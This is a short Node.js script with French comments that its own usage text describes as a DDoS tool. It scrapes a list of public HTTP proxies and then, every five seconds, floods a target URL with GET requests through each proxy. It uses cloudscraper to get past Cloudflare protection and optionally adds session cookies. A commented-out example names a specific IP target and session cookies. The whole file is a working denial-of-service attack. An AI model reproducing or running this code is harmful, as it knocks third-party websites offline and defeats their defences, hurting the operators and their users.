const request = require('request');
const cloudscraper = require('cloudscraper');
const events = require('events');

events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;
process.setMaxListeners(0);


var args = process.argv.slice(2);

var target="";
var cookiesAdded="";

/*if(!args[0] || args[0] == null){
	console.log("Veuillez indiquer l'url à DDOS\nEx: node index.js https://site.com (cookies optionnels)");
	process.exit(1);
}*/

//target=args[0]
target= process.argv[2]

if(args[1]){
	cookiesAdded=args[1]
}

//Ne modifier QUEEEEE ça !
//let target = "http://23.237.42.18/hit";
//let cookiesAdded = "mitigation=1591285927; WHMCSy551iLvnhYt7=eh0lp51lcqiupv091concbssq0; crisp-client%2Fsession%2F74f1670f-4058-4001-9685-00a8413587cd=session_93105175-3cb2-4381-8372-fdd44ab34748"
//FIN DES MODIFICATIONSAUTORISEES

var options = {
    'method': 'GET',
    'url': target,
    'headers': {
        'Cookie': cookiesAdded
    },
    form: {

    }
};

var theproxy = 0;
var cookies = {}
var proxies = {}
request.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http', (err, res, body) => { // don't change this
    if(body){
		proxies = body.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
		console.log(proxies.length + " Proxies loaded.");
	}
})

let cpt=0
let cptErr=0
setInterval(function() {
	console.log("Nouvelle sauce (sauce précédente : "+cpt+"/"+cptErr+")");
	cpt=0
	cptErr=0
	for(let i=0;i<proxies.length;i++){
		if(proxies[i] && proxies[i] != null){
			var options = {
				'method': 'GET',
				'url': target,
				'proxy':'http://'+proxies[i],
				'headers': {
					'Cookie': cookiesAdded
				},
				form: {}
			};
			
			/*try {
				request(options)
				console.log("ping");
			} catch(err){
				console.log("erreur");
			}*/
			
			cloudscraper({
				url: target,
				method: "GET",
				proxy: "http://"+proxies[i]
			}).then(function(data){
				cpt++;
			}).catch(function(err){
				cptErr++;
			})
		}
	}
}, 5000)
